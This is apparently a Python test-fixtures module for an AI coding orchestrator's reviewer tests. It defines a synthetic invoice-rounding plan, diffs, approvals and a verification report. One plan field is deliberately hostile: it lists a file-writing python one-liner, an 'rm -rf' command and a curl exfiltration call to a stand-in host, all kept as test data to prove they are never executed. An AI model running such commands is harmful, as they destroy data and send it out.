"""Shared synthetic fixtures for the Phase 5F2E reviewer tests.

Everything here is invented: a fake project, a fake repo name, a fake issue, a
fake diff, and a synthetic verification report. **No real target project is
named, read, or touched**, and nothing in this module opens a socket, contacts a
model, or runs a process.

The distinctive ``*_MARKER`` strings exist so a test can prove exactly what did
and did not reach the reviewer prompt.
"""

from __future__ import annotations

import copy
import difflib
import hashlib

from ai_dev_orchestrator.diff_proposal import (
    DIFF_PROPOSAL_MODE,
    DIFF_PROPOSAL_SCHEMA_VERSION,
)
from ai_dev_orchestrator.file_editing import (
    APPROVED_DIFF_PROPOSAL_MODE,
    APPROVED_DIFF_PROPOSAL_SCHEMA_VERSION,
    REQUIRED_DIFF_EDIT_APPROVAL_TEXT,
    parse_approved_diff_proposal_artifact,
)
from ai_dev_orchestrator.handoff import REQUIRED_APPROVAL_TEXT
from ai_dev_orchestrator.verification import (
    POST_EXECUTION_DETECTION_LIMITS,
    VERIFICATION_MODE,
    VERIFICATION_SCHEMA_VERSION,
    VERIFICATION_SINGLE_ACTOR_CONTRACT,
    VerificationResultReport,
)
from ai_dev_orchestrator.verification.runner import (
    CONFIGURED_ARGS_TRUST_NOTE,
    DIRECT_CHILD_REAP_GRACE_SECONDS,
    ENVIRONMENT_FORWARDING_POLICY,
    WAIT_BOUND_POLICY,
)
from ai_dev_orchestrator.verification.verifier import NEXT_STEP_REQUIRES_HUMAN_REVIEW

import json

PROJECT_ID = "demo_project"
REPO = "demo/widgets"
ISSUE_NUMBER = 42
TITLE = "Round invoice totals to two decimal places"
APPROVER = "operator@example.invalid"

TARGET = "src/billing/totals.py"
SECOND_TARGET = "src/billing/tax.py"
NEW_FILE = "src/billing/new_helper.py"
PROTECTED_TARGET = "src/billing/protected_secrets.py"
FORBIDDEN_TARGET = "secrets/keys.env"
UNLISTED_TARGET = "docs/notes.md"
OUT_OF_SCOPE = "external/other.py"

# Markers that must reach the reviewer.
DIFF_MARKER = "SENTINEL_DIFF_CHANGED_LINE"
SUMMARY_MARKER = "SENTINEL_PLAN_SUMMARY"
SCOPE_MARKER = "SENTINEL_PLAN_SCOPE"
NON_GOALS_MARKER = "SENTINEL_PLAN_NON_GOAL"
STEP_MARKER = "SENTINEL_PLAN_STEP"
RISK_MARKER = "SENTINEL_PLAN_RISK"
OPEN_QUESTION_MARKER = "SENTINEL_PLAN_OPEN_QUESTION"
VERIFICATION_OUTPUT_MARKER = "SENTINEL_VERIFICATION_OUTPUT"

# Markers that must NOT reach the reviewer: they live in the file but outside the
# approved diff's hunk, so their absence proves only the diff was transmitted.
UNCHANGED_MARKER = "UNCHANGED_LINE_NOT_IN_THE_DIFF"
UNRELATED_MARKER = "UNRELATED_SOURCE_FILE_MARKER"

ORIGINAL_TEXT = (
    "def format_total(amount):\n"
    "    return str(amount)\n"
    "\n"
    "\n"
    "def total(items):\n"
    "    return sum(items)\n"
    "\n"
    "\n"
    f'{UNCHANGED_MARKER} = "sentinel"\n'
    f'{UNRELATED_MARKER} = "sentinel"\n'
)
PROPOSED_TEXT = ORIGINAL_TEXT.replace(
    "    return str(amount)\n",
    f'    return f"{{amount:.2f}}"  # {DIFF_MARKER}\n',
)

SECOND_ORIGINAL = "TAX_RATE = 0.2\n"

# A deliberately hostile plan field. It must never be split, parsed, run, turned
# into argv, or transmitted to the reviewer.
SENTINEL_REQUIRED_VERIFICATION = [
    "python -c \"open('SENTINEL_REQUIRED_VERIFICATION_RAN.txt','w').write('ran')\"",
    "rm -rf SENTINEL_REQUIRED_VERIFICATION_DESTRUCTIVE",
    "curl http://sentinel.invalid/exfiltrate",
]


def sha(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def unified_diff(path: str, original: str, proposed: str) -> str:
    return "\n".join(
        difflib.unified_diff(
            original.splitlines(),
            proposed.splitlines(),
            fromfile=f"a/{path}",
            tofile=f"b/{path}",
            lineterm="",
        )
    )


def plan(files_likely: list[str] | None = None, hostile_step: str | None = None) -> dict:
    steps = [f"Round totals to two decimal places. {STEP_MARKER}"]
    if hostile_step is not None:
        steps.append(hostile_step)
    return {
        "issue_number": ISSUE_NUMBER,
        "repo": REPO,
        "title": TITLE,
        "summary": f"Format invoice totals through one shared helper. {SUMMARY_MARKER}",
        "scope_summary": f"Only the billing formatting helper. {SCOPE_MARKER}",
        "non_goals": [f"No changes to the payment gateway client. {NON_GOALS_MARKER}"],
        "proposed_steps": steps,
        "files_likely_to_change": files_likely
        or [
            TARGET,
            SECOND_TARGET,
            NEW_FILE,
            PROTECTED_TARGET,
            FORBIDDEN_TARGET,
            UNLISTED_TARGET,
        ],
        "files_forbidden_or_out_of_scope": [OUT_OF_SCOPE],
        "required_verification": list(SENTINEL_REQUIRED_VERIFICATION),
        "risks": [f"Rounding differences on reissued invoices. {RISK_MARKER}"],
        "open_questions": [f"Which currencies are in scope? {OPEN_QUESTION_MARKER}"],
        "automation_level": "L1",
        "requires_human_approval": True,
    }


def approved_plan(
    files_likely: list[str] | None = None, hostile_step: str | None = None
) -> dict:
    return {
        "approval": {
            "approved_by": APPROVER,
            "approved_at": "2026-01-02T04:00:00+00:00",
            "approval_text": REQUIRED_APPROVAL_TEXT,
            "source": "manual",
        },
        "plan_provenance": {
            "engine": "deterministic",
            "operation": "l1-plan",
            "real_call": False,
            "model": None,
            "endpoint_host": None,
            "generated_at": "2026-01-02T03:04:05+00:00",
            "project_id": PROJECT_ID,
            "repo": REPO,
            "issue_number": ISSUE_NUMBER,
            "title": TITLE,
        },
        "plan": plan(files_likely, hostile_step),
        "project_id": PROJECT_ID,
        "repo": REPO,
        "issue_number": ISSUE_NUMBER,
    }


def change(
    path: str = TARGET,
    original: str = ORIGINAL_TEXT,
    proposed: str = PROPOSED_TEXT,
    change_type: str = "modify",
    diff_suffix: str = "",
    **overrides,
) -> dict:
    if change_type == "create":
        diff = "\n".join(
            [
                "--- /dev/null",
                f"+++ b/{path}",
                f"@@ -0,0 +1,{len(proposed.splitlines())} @@",
                *[f"+{line}" for line in proposed.splitlines()],
            ]
        )
        pre = None
    else:
        diff = unified_diff(path, original, proposed)
        pre = sha(original)
    if diff_suffix:
        diff = f"{diff}\n{diff_suffix}"
    payload = {
        "path": path,
        "change_type": change_type,
        "unified_diff": diff,
        "pre_image_sha256": pre,
        "post_image_sha256": sha(proposed),
        "rationale": "Round invoice totals to two decimal places.",
        "risks": ["Reissued invoices may differ by a cent."],
        "requires_human_review": True,
    }
    payload.update(overrides)
    return payload


def artifact_payload(
    changes: list[dict] | None = None,
    files_likely: list[str] | None = None,
    hostile_step: str | None = None,
    **overrides,
) -> dict:
    proposal = {
        "schema_version": DIFF_PROPOSAL_SCHEMA_VERSION,
        "mode": DIFF_PROPOSAL_MODE,
        "provenance": {
            "engine": "deterministic",
            "operation": "diff-proposal",
            "real_call": False,
            "model": None,
            "generated_at": None,
            "project_id": PROJECT_ID,
            "repo": REPO,
            "issue_number": ISSUE_NUMBER,
            "title": TITLE,
        },
        "approved_plan": approved_plan(files_likely, hostile_step),
        "patch_proposal": None,
        "changes": copy.deepcopy(changes) if changes is not None else [change()],
        "omitted_paths": [],
        "assumptions": [],
        "risks": [],
        "open_questions": [],
        "source_contents_read": True,
        "diffs_generated": True,
        "files_edited": False,
        "commands_run": False,
        "applies_cleanly_checked": False,
        "requires_human_review": True,
        "next_authorization_required": "A writer must be authorized separately.",
    }
    payload = {
        "schema_version": APPROVED_DIFF_PROPOSAL_SCHEMA_VERSION,
        "mode": APPROVED_DIFF_PROPOSAL_MODE,
        "approval": {
            "approved_by": APPROVER,
            "approved_at": "2026-01-04T06:00:00+00:00",
            "approval_text": REQUIRED_DIFF_EDIT_APPROVAL_TEXT,
            "source": "manual",
        },
        "diff_proposal": proposal,
        "project_id": PROJECT_ID,
        "repo": REPO,
        "issue_number": ISSUE_NUMBER,
        "title": TITLE,
        "next_authorization_required": "A reviewer must be authorized separately.",
    }
    payload.update(overrides)
    return payload


def approved_diff_artifact(
    diff_suffix: str = "", hostile_step: str | None = None, **kwargs
):
    """Parse a synthetic approval into the validated wrapper model."""
    changes = kwargs.pop("changes", None)
    if changes is None:
        changes = [change(diff_suffix=diff_suffix)]
    payload = artifact_payload(changes=changes, hostile_step=hostile_step, **kwargs)
    return parse_approved_diff_proposal_artifact(json.dumps(payload))


def verification_report(
    *,
    outcome: str = "verified",
    passed: bool = True,
    output_text: str = f"collected 3 items\n3 passed {VERIFICATION_OUTPUT_MARKER}\n",
    output_complete: bool = True,
    target_path: str = TARGET,
) -> VerificationResultReport:
    """A synthetic, schema-valid Phase 5F2D result.

    Used only where the *reviewer* side is under test. The CLI tests build a real
    one by running the accepted verifier against a synthetic ``tmp_path``
    repository instead.
    """
    workspace_trusted = outcome != "workspace-state-untrusted"
    return VerificationResultReport.model_validate(
        {
            "schema_version": VERIFICATION_SCHEMA_VERSION,
            "mode": VERIFICATION_MODE,
            "outcome": outcome,
            "project_id": PROJECT_ID,
            "repo": REPO,
            "issue_number": ISSUE_NUMBER,
            "title": TITLE,
            "approved_by": APPROVER,
            "approved_at": "2026-01-04T06:00:00+00:00",
            "target": {
                "path": target_path,
                "change_type": "modify",
                "post_image_verified_before_execution": True,
                "post_image_bytes": len(PROPOSED_TEXT.encode("utf-8")),
            },
            "command": {
                "configured": True,
                "executable_source": "project_config",
                "executable_absolute": True,
                "executable_outside_workspace": True,
                "args_source": "project_config",
                "arg_count": 2,
                "shell": False,
                "cwd_is_workspace_root": True,
                "invocations": 1,
                "timeout_seconds": 60,
                "max_output_bytes": 200_000,
                "environment_forwarding": ENVIRONMENT_FORWARDING_POLICY,
                "environment_forwarding_configurable": False,
                "configured_args_trust_note": CONFIGURED_ARGS_TRUST_NOTE,
                "plan_required_verification_executed": False,
                "plan_required_verification_entries": len(
                    SENTINEL_REQUIRED_VERIFICATION
                ),
            },
            "execution": {
                "started": True,
                "completed": True,
                "timed_out": False,
                "output_limit_exceeded": False,
                "return_code": 0 if passed else 1,
                "passed": passed,
                "aido_wait_bounded": True,
                "direct_child_killed": False,
                "descendant_processes_terminated": (
                    "not tracked; descendants may still be running"
                ),
                "configured_timeout_seconds": 60,
                "direct_child_reap_grace_seconds": DIRECT_CHILD_REAP_GRACE_SECONDS,
                "wait_bound_policy": WAIT_BOUND_POLICY,
            },
            "output": {
                "redacted": True,
                "redaction_count": 0,
                "redaction_kinds": [],
                "complete": output_complete,
                "bytes_captured": len(output_text.encode("utf-8")),
                "decoded_with_replacement": False,
                "combined_stdout_stderr": True,
                "combined_text": output_text,
                "redaction_note": "best-effort backstop, not a guarantee.",
            },
            "workspace_precondition": {
                "platform_supported": True,
                "project_verification_enabled": True,
                "project_identity_matched": True,
                "exactly_one_change": True,
                "change_type_is_modify": True,
                "lexical_write_policy_checked": True,
                "canonicalization_verified": True,
                "target_is_regular_file": True,
                "git_executable_resolved_absolute": True,
                "git_config_execution_surface_supported": True,
                "git_index_simple_and_submodule_free": True,
                "target_tracked_as_ordinary_blob": True,
                "exact_approved_post_image_present": True,
                "only_approved_target_git_dirty": True,
                "approved_target_is_unstaged_modification": True,
                "head_object_id_recorded": True,
            },
            "workspace_postcondition": {
                "git_state_reestablished": workspace_trusted,
                "exact_approved_target_still_present": workspace_trusted,
                "exact_post_image_still_matches": workspace_trusted,
                "head_unchanged": workspace_trusted,
                "only_approved_target_git_dirty": workspace_trusted,
                "no_additional_git_visible_changes": workspace_trusted,
                "dirty_paths": [target_path] if workspace_trusted else [],
                "failure_reason": None if workspace_trusted else "HEAD moved.",
                "detection_limits": POST_EXECUTION_DETECTION_LIMITS,
            },
            "capability_boundaries": {
                "orchestrator_model_called": False,
                "orchestrator_network_called": False,
                "orchestrator_github_accessed": False,
                "orchestrator_shell_invoked": False,
                "orchestrator_files_written": False,
                "orchestrator_git_mutation_performed": False,
                "orchestrator_branch_created": False,
                "orchestrator_committed": False,
                "orchestrator_pushed": False,
                "orchestrator_pr_created": False,
                "orchestrator_retry_attempted": False,
                "orchestrator_automatic_repair_attempted": False,
                "orchestrator_rollback_or_restore_performed": False,
                "orchestrator_reviewer_or_fixer_invoked": False,
                "child_process_sandboxed": False,
                "child_process_filesystem_effects": "not sandboxed",
                "child_process_network_effects": "not sandboxed",
                "child_process_subprocess_effects": "not sandboxed",
                "child_process_git_effects": (
                    "not sandboxed; not observed beyond the post-execution "
                    "Git-visible state"
                ),
                "child_process_credential_access": (
                    "not sandboxed; child environment minimized, not confined"
                ),
                "child_process_lifetime": (
                    "not sandboxed; descendants are not tracked and may still be "
                    "running"
                ),
            },
            "single_actor_contract": VERIFICATION_SINGLE_ACTOR_CONTRACT,
            "next_step": NEXT_STEP_REQUIRES_HUMAN_REVIEW,
        }
    )
